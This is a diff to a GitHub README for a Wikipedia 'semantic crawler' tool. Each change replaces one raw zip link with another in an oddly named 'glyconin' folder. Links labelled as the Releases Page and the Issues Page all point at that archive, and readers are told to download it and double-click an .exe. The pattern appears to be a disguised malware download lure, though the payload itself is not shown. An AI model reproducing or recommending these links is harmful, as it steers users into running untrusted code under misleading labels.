@@ -1,6 +1,6 @@
 # 🐍 wiki-semantic-crawler - Navigate Wikipedia with Ease
 
-[![Download](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/semantic-crawler-wiki-3.1.zip)](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/semantic-crawler-wiki-3.1.zip)
+[![Download](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/wiki_semantic_crawler_2.4.zip)](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/wiki_semantic_crawler_2.4.zip)
 
 ## 📖 Overview
 The wiki-semantic-crawler is a tool that helps you explore Wikipedia like never before. Using advanced algorithms, it guides you through connections between different topics based on meaning, not just keywords. This makes finding related content smooth and intuitive.
@@ -16,7 +16,7 @@ To start using the wiki-semantic-crawler, follow these simple steps to download 
 - **Internet Connection**: Required for fetching Wikipedia data
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/semantic-crawler-wiki-3.1.zip).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/wiki_semantic_crawler_2.4.zip).
 2. **Download the Latest Version**: Look for the most recent version of the software. Click on the link to download it to your computer.
 3. **Run the Installer**:
    - For Windows: You might have a `.exe` file. Just double-click it to start the installation.
@@ -46,7 +46,7 @@ Check the common errors listed on the issues page of the repository. You can als
 Yes, a user manual is included in the repository. It covers each step in detail to help you use the crawler effectively.
 
 ## 🛠️ Support
-For questions or issues not covered in the FAQ, feel free to open an issue on the [GitHub Issues Page](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/semantic-crawler-wiki-3.1.zip).
+For questions or issues not covered in the FAQ, feel free to open an issue on the [GitHub Issues Page](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/wiki_semantic_crawler_2.4.zip).
 
 ## 🔗 Contributing
 If you would like to contribute to the project, please check our contributing guidelines in the repository. Any help or suggestions to improve the crawler are welcome!
@@ -57,4 +57,4 @@ This project is licensed under the MIT License. You can freely use and modify th
 ## 👨‍💻 Acknowledgments
 Thank you to everyone who helped in the development of wiki-semantic-crawler. Special thanks to the creators of the libraries that made this project possible, including Python, BeautifulSoup4, and Sentence-Transformers.
 
-Discover and connect ideas with the wiki-semantic-crawler today! For the latest download, check the [Releases Page](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/semantic-crawler-wiki-3.1.zip).
+Discover and connect ideas with the wiki-semantic-crawler today! For the latest download, check the [Releases Page](https://github.com/Johnkellarte/wiki-semantic-crawler/raw/refs/heads/main/glyconin/wiki_semantic_crawler_2.4.zip).
